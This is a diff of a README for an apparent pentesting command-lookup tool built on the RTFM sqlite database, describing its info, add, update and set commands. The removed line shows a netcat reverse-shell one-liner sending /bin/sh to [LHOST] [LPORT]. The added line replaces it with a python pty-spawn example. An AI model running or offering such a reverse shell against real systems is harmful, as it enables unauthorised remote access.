@@ -9,7 +9,7 @@ I'm currently using the sqlite database that [RTFM](https://github.com/leostat/r
 - up/down arrow keys to highlight a command from the current search or from the history. Pressing return copies that command to the clipboard.  
 - 'info' displays full information on the currently selected command along with any variables that can be set and that are already set.  
 - 'add -c [command]' to add a new command to the database.  optional: -d to add a comment/description with the command.
-- 'update [column] [content]' to update a database column in the currently selected command.  At the moment the only columns to update are 'command', 'comment' and 'author'. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
+- 'update [column] [content]' to update a database column in the currently selected command.  At the moment the only columns to update are 'command', 'comment' and 'author'. Examples: "update comment spawn a pty via python3", "update author greg scharf", "update command python3 -c 'import pty;pty.spawn("/bin/bash")'".  
 - 'set' to set variables that will be replaced in commands that have placeholders such as [LHOST], [RHOST], etc. Example: 'set LHOST 10.200.13.3'
 
 ## To Add
